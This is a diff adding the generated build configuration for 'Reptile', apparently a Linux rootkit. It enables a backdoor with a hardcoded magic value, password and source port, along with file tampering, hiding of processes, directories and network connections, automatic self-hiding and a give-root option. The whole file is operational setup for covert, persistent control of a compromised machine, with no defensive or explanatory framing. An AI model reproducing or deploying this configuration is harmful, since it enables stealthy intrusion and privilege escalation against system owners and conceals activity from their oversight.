@@ -1,0 +1,44 @@
+#
+# Automatically generated file; DO NOT EDIT.
+# Reptile's configuration
+#
+
+#
+# Chose the features you wanna enable
+#
+CONFIG_BACKDOOR=y
+
+#
+# Backdoor configuration
+#
+MAGIC_VALUE="hax0r"
+PASSWORD="s3cr3t"
+SRCPORT=666
+
+#
+# END
+#
+CONFIG_FILE_TAMPERING=y
+
+#
+# Name used in file tampering tags
+#
+TAG_NAME="reptile"
+
+#
+# END
+#
+CONFIG_HIDE_PROC=y
+CONFIG_HIDE_DIR=y
+
+#
+# Hide name (needed to create Reptile's folder)
+#
+HIDE="reptile"
+
+#
+# END
+#
+CONFIG_HIDE_CONN=y
+CONFIG_AUTO_HIDE=y
+CONFIG_GIVE_ROOT=y
